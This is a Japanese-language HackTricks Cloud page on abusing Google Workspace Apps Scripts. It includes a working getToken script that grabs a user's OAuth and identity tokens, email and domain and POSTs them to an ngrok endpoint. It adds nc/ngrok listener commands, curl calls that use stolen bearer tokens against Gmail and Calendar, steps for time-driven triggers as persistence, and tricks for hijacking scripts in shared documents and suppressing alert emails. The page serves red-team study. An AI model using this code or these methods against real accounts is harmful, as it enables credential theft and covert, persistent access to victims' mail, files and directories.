# GWS - App Scripts

{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出してハッキングトリックを共有してください。

</details>
{% endhint %}

## App Scripts

App Scriptsは、**エディター権限を持つユーザーが関連付けられたドキュメントにアクセスし、OAuthプロンプトを受け入れた後にトリガーされるコード**です。\
所有者はApp Scriptsを**一定時間ごとに実行するように設定**することもできます（持続性）。

### App Scriptの作成

App Scriptを作成する方法はいくつかありますが、最も一般的な方法は**Googleドキュメント（どのタイプでも）**からと**スタンドアロンプロジェクト**としてです：

<details>

<summary>Google Docs、Sheets、またはSlidesからコンテナバウンドプロジェクトを作成</summary>

1. ドキュメント、スプレッドシート、またはプレゼンテーションを開きます。
2. **拡張機能** > **Google Apps Script**をクリックします。
3. スクリプトエディタで、**Untitled project**をクリックします。
4. プロジェクトに名前を付けて**Rename**をクリックします。

</details>

<details>

<summary>スタンドアロンプロジェクトを作成</summary>

Apps Scriptからスタンドアロンプロジェクトを作成するには：

1. [`script.google.com`](https://script.google.com/)に移動します。
2. **New Project**をクリックします。
3. スクリプトエディタで、**Untitled project**をクリックします。
4. プロジェクトに名前を付けて**Rename**をクリックします。

</details>

<details>

<summary>Google Driveからスタンドアロンプロジェクトを作成</summary>

1. [Google Drive](https://drive.google.com/)を開きます。
2. **New** > **More** > **Google Apps Script**をクリックします。

</details>

<details>

<summary>Google Formsからコンテナバウンドプロジェクトを作成</summary>

1. Google Formsでフォームを開きます。
2. より多くのオプション more\_vert > **Script editor**をクリックします。
3. スクリプトエディタで、**Untitled project**をクリックします。
4. プロジェクトに名前を付けて**Rename**をクリックします。

</details>

<details>

<summary>claspコマンドラインツールを使用してスタンドアロンプロジェクトを作成</summary>

`clasp`は、ターミナルからApps Scriptプロジェクトを作成、プル/プッシュ、デプロイできるコマンドラインツールです。

詳細については、[Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp)を参照してください。

</details>

## App Scriptシナリオ <a href="#create-using-clasp" id="create-using-clasp"></a>

### App Scriptを使用してGoogleシートを作成

App Scriptを作成するには、このシナリオではGoogleシートを作成し、**`Extensions > App Scripts`**に移動します。これにより、**シートにリンクされた新しいApp Script**が開きます。

### トークンの漏洩

OAuthトークンへのアクセスを許可するために、**`Services +`をクリックして**以下のようなスコープを追加する必要があります：

* **AdminDirectory**: ディレクトリのユーザーとグループにアクセス（ユーザーに十分な権限がある場合）
* **Gmail**: Gmailデータにアクセスするため
* **Drive**: ドライブデータにアクセスするため
* **Google Sheets API**: トリガーと連動するため

**必要なスコープを自分で変更**するには、プロジェクト設定に移動して、**`Show "appsscript.json" manifest file in editor`を有効にします。**
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

リクエストをキャプチャするには、次のコマンドを実行するだけです:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
### アプリスクリプトを実行するためにリクエストされるアクセス許可：

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
外部リクエストが行われると、OAuthプロンプトは**外部エンドポイントにアクセスする権限を求める**こともあります。
{% endhint %}

### トリガーの作成

アプリを読み込んだら、**⏰ トリガー**をクリックしてトリガーを作成します。**関数**としては**`getToken`**を選択し、デプロイメントで**`Head`**を選択し、イベントソースでは**`From spreadsheet`**を選択し、イベントタイプでは**`On open`**または**`On edit`**（必要に応じて）を選択して保存します。

必要に応じて、何かをデバッグしたい場合は、**アプリスクリプトの実行タブで実行を確認**できます。

### 共有

**アプリスクリプト**を**トリガー**するために、被害者は**エディターアクセス**で接続する必要があります。

{% hint style="success" %}
**アプリスクリプト**を実行するために使用される**トークン**は、**トリガーの作成者のもの**になります。たとえ他のユーザーがエディターとしてファイルを開いても、そのトリガーの作成者のトークンが使用されます。
{% endhint %}

### 共有されたドキュメントの悪用

{% hint style="danger" %}
誰かが**アプリスクリプトを使用してトリガーを作成し、アプリスクリプトのHeadを使用したドキュメントを共有**した場合、アプリスクリプトコードを変更して（たとえばトークンを盗む機能を追加して）アクセスし、**そのドキュメントを共有したユーザーの権限でアプリスクリプトが実行されます**！（トリガーの作成時に与えられたアクセススコープが、所有者のOAuthトークンにアクセススコープとして設定されます）。

**スクリプトの作成者には、スクリプトが変更されたことを示す通知が送信されます**（アラートを防ぐためにGmailアクセス許可を使用してフィルターを生成するのはどうでしょうか？）
{% endhint %}

{% hint style="success" %}
**攻撃者がアプリスクリプトのスコープを変更**した場合、更新は**ドキュメントに適用されません**。そのため、変更がある新しいトリガーが作成されるまで、所有者の作成者トークンを盗むことはできません。攻撃者が作成したトリガーで設定したスコープよりも多くのスコープを持つトークンを盗むことはできません。
{% endhint %}

### 共有ではなくコピー

ドキュメントを共有するリンクを作成すると、次のようなリンクが作成されます：`https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
末尾の**"/edit"**を**"/copy"**に変更すると、Googleにアクセスする代わりに、そのドキュメントのコピーを生成するかどうかを尋ねられます：

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

ユーザーがコピーしてアクセスすると、**ドキュメントの内容とアプリスクリプトがコピーされます**が、**トリガーはコピーされない**ため、**何も実行されません**。

### Webアプリケーションとして共有

アプリスクリプトをWebアプリケーションとして共有することも可能です（アプリスクリプトのエディターでWebアプリケーションとしてデプロイ）。ただし、次のようなアラートが表示されます：

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

必要な権限を求める**典型的なOAuthプロンプトに続いて**表示されます。

### テスト

次のコードを使用して収集したトークンをリストアップすることができます：

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

ユーザーのカレンダーをリストアップします:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## アプリスクリプトを永続化として使用

永続性の1つのオプションは、**ドキュメントを作成し、getTokenのトリガーを追加し、攻撃者と共有する**ことです。攻撃者がファイルを開くたびに、**被害者のトークンを外部に送信**します。

また、App Scriptを作成し、X時間ごとにトリガーを設定して実行することも可能です（例：毎分、毎時、毎日...）。**侵害された資格情報や被害者のセッションを持つ攻撃者は、App Scriptの時間トリガーを設定し、非常に特権のあるOAuthトークンを毎日漏洩**させることができます：

単にApp Scriptを作成し、トリガーに移動し、トリガーを追加し、イベントソースをTime-drivenに選択し、最適なオプションを選択します：

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
これにより、このことについてのセキュリティアラートメールとモバイルへのプッシュメッセージが作成されます。
{% endhint %}

### 共有ドキュメントの未検証プロンプトバイパス

さらに、誰かが**編集アクセス**であなたと**共有した**ドキュメントがある場合、そのドキュメント内に**App Scriptを生成**し、そのドキュメントの**OWNER（作成者）がApp Scriptの所有者**になります。

{% hint style="warning" %}
これは、**ドキュメントの作成者が、その中で作成された任意のApp Scriptの作成者**として表示されることを意味します。

これはまた、そのドキュメントの作成者のWorkspace環境によって、App Scriptが**信頼**されることを意味します。
{% endhint %}

{% hint style="danger" %}
これはまた、**App Scriptがすでに存在しており、人々がアクセスを許可**している場合、そのドキュメントに**エディタ**権限を持つ誰でも**変更してアクセスを悪用**することができます。\
これを悪用するには、人々にApp Scriptをトリガーするようにする必要があります。また、**スクリプトをWebアプリとして公開**するという便利なトリックもあります。**アクセス**をすでに**許可**している**人々**がWebページにアクセスすると、App Scriptが**トリガー**されます（これは`<img>`タグを使用しても機能します）。
{% endhint %}

{% hint style="success" %}
AWSハッキングの学習と実践：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と実践：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、**ハッキングトリックを共有**してください。

</details>
{% endhint %}
